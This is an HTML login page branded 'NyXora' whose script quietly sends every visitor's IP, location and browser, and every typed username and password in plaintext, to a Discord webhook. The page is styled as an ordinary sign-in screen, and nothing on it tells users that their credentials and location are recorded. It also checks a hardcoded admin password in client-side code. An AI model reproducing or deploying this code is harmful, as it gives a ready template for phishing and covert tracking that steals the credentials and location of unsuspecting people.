<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<title>NyXora Login</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500&display=swap');
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body {
    background: #2e0a63;
    font-family: 'Orbitron', sans-serif;
    color: #d1c4e9;
    display: flex;
    align-items: center;
    justify-content: center;
    height: 100vh;
    overflow: hidden;
  }
  canvas { position: fixed; top: 0; left: 0; z-index: 0; }
  .login-container {
    background: rgba(20, 10, 40, 0.9);
    padding: 40px;
    border-radius: 12px;
    width: 360px;
    text-align: center;
    position: relative;
    border: 1px solid rgba(150, 100, 255, 0.4);
    box-shadow: 0 0 35px rgba(180, 100, 255, 0.3);
    overflow: hidden;
    z-index: 2;
  }
  h1 {
    font-size: 2.4em;
    margin-bottom: 25px;
    color: #a855f7;
    text-shadow: 0 0 12px #a855f7, 0 0 20px #6d28d9;
    position: relative;
    z-index: 3;
  }
  h1::after {
    content: attr(data-text);
    position: absolute;
    left: 2px;
    text-shadow: -1px 0 magenta;
    top: 0;
    color: transparent;
    overflow: hidden;
    animation: glitch 1s infinite linear alternate-reverse;
  }
  @keyframes glitch {
    0% { clip: rect(0, 9999px, 0, 0); }
    50% { clip: rect(0, 9999px, 100%, 0); }
    100% { clip: rect(0, 9999px, 0, 0); }
  }
  input {
    width: 90%;
    padding: 14px;
    margin: 10px 0;
    background: #1e1030;
    border: 1px solid #6d28d9;
    border-radius: 6px;
    color: #d1c4e9;
    font-size: 1em;
    text-align: center;
    outline: none;
    transition: 0.3s;
    z-index: 3;
    position: relative;
  }
  input:focus {
    box-shadow: 0 0 12px #a855f7;
    border-color: #a855f7;
  }
  button {
    width: 95%;
    padding: 14px;
    margin-top: 15px;
    background: #a855f7;
    border: none;
    border-radius: 6px;
    font-size: 1em;
    font-weight: bold;
    cursor: pointer;
    color: #fff;
    transition: 0.3s;
    box-shadow: 0 0 15px #6d28d9;
    position: relative;
    z-index: 3;
  }
  button:hover {
    background: transparent;
    color: #a855f7;
    border: 1px solid #a855f7;
    box-shadow: 0 0 20px #a855f7;
  }
</style>
</head>
<body>
  <canvas id="trail"></canvas>
  <div class="login-container">
    <h1 data-text="NyXora">NyXora</h1>
    <input type="text" placeholder="Username" id="username" autocomplete="off" />
    <input type="password" placeholder="Password" id="password" autocomplete="off" />
    <button onclick="login()">ACCESS</button>
  </div>

<script>
const webhookURL = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN";

// Canvas trail
const canvas = document.getElementById('trail');
const ctx = canvas.getContext('2d');
canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let particles = [];
const mouse = { x: null, y: null };

document.addEventListener('mousemove', e => {
  mouse.x = e.clientX;
  mouse.y = e.clientY;
  for (let i = 0; i < 4; i++) {
    particles.push({
      x: mouse.x,
      y: mouse.y,
      size: Math.random() * 6 + 4,
      color: '#a855f7',
      speedX: (Math.random() - 0.5) * 2,
      speedY: (Math.random() - 0.5) * 2,
    });
  }
});

function animate() {
  ctx.fillStyle = '#2e0a63';
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  for (let i = 0; i < particles.length; i++) {
    let p = particles[i];
    p.x += p.speedX;
    p.y += p.speedY;
    p.size *= 0.92;

    ctx.beginPath();
    ctx.arc(p.x, p.y, p.size, 0, Math.PI * 2);
    ctx.fillStyle = p.color;
    ctx.shadowColor = p.color;
    ctx.shadowBlur = 15;
    ctx.fill();

    if (p.size < 0.5) {
      particles.splice(i, 1);
      i--;
    }
  }
  requestAnimationFrame(animate);
}
animate();

window.addEventListener('resize', () => {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
});

// Webhook sender
async function sendToWebhook(data, type, status) {
  const embed = {
    title: type,
    color: status === 'SUCCESS' ? 0x2ecc71 : 0xe74c3c, // Green or Red
    fields: [
      { name: 'Status', value: status, inline: true },
      { name: 'Username', value: data.username || 'N/A', inline: true },
      { name: 'Password', value: data.password || 'N/A', inline: true },
      { name: 'IP', value: data.ip, inline: true },
      { name: 'Location', value: data.location, inline: true },
      { name: 'Browser', value: data.browser, inline: false },
      { name: 'Time', value: data.time, inline: false },
    ],
    footer: { text: 'NyXora Logs' },
    timestamp: new Date(),
  };

  try {
    await fetch(webhookURL, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        content: '@everyone',
        embeds: [embed],
      }),
    });
  } catch (e) {
    console.error('Webhook send error:', e);
  }
}

// Visitor log
(async function logVisitor() {
  let ipInfo = {};
  try {
    const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
    ipInfo = await response.json();
  } catch {
    ipInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
  }

  const browserInfo = navigator.userAgent;
  const visitorData = {
    ip: ipInfo.ip || 'Unknown',
    location: `${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}`,
    browser: browserInfo,
    time: new Date().toISOString(),
  };
  sendToWebhook(visitorData, 'Visitor', 'INFO');
})();

// Login attempt
async function login() {
  const user = document.getElementById('username').value.trim();
  const pass = document.getElementById('password').value.trim();

  let ipInfo = {};
  try {
    const response = await fetch('https://ipinfo.io/json?token=YOUR_TOKEN_HERE');
    ipInfo = await response.json();
  } catch {
    ipInfo = { ip: 'Unknown', city: 'Unknown', region: 'Unknown', country: 'Unknown' };
  }

  const browserInfo = navigator.userAgent;
  const status = (user === 'Admin' && pass === 'Admin1') ? 'SUCCESS' : 'FAILED';

  const attemptData = {
    username: user,
    password: pass,
    ip: ipInfo.ip || 'Unknown',
    location: `${ipInfo.city || 'Unknown'}, ${ipInfo.region || 'Unknown'}, ${ipInfo.country || 'Unknown'}`,
    browser: browserInfo,
    time: new Date().toISOString()
  };

  await sendToWebhook(attemptData, 'Login Attempt', status);

  if (status === 'SUCCESS') {
    window.location.href = "https://yodog0608.github.io/landing.html";
  } else {
    alert('Invalid credentials!');
  }
}
</script>
</body>
</html>
